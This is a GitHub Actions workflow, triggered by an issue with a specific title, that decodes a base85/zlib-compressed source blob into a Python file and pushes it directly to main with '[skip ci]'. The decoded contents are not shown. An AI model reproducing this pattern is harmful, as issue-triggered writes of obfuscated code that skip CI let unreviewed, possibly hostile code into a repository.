name: crypto-provider-bootstrap
on:
  issues:
    types: [opened, reopened]
concurrency:
  group: crypto-provider-bootstrap
  cancel-in-progress: true
jobs:
  decode:
    if: github.event.issue.title == '[wr-crypto-provider-fix-20260820]'
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09
        with:
          fetch-depth: 0
      - uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1
        with:
          python-version: '3.12'
      - name: Decode embedded runner source
        shell: bash
        run: |
          python - <<'PY'
          import base64, zlib
          import a
          from pathlib import Path
          Path('recovery').mkdir(exist_ok=True)
          src = zlib.decompress(base64.b85decode(a.SOURCE)).decode('utf-8')
          Path('recovery/runner2_core_decoded.py').write_text(src, encoding='utf-8')
          PY
      - name: Persist decoded source
        shell: bash
        run: |
          git config user.name 'wave-rider-operator[bot]'
          git config user.email 'wave-rider-operator[bot]@users.noreply.github.com'
          git add recovery/runner2_core_decoded.py
          git commit -m 'ops: decode runner2 core for provider repair [skip ci]'
          git pull --rebase origin main
          git push origin HEAD:main
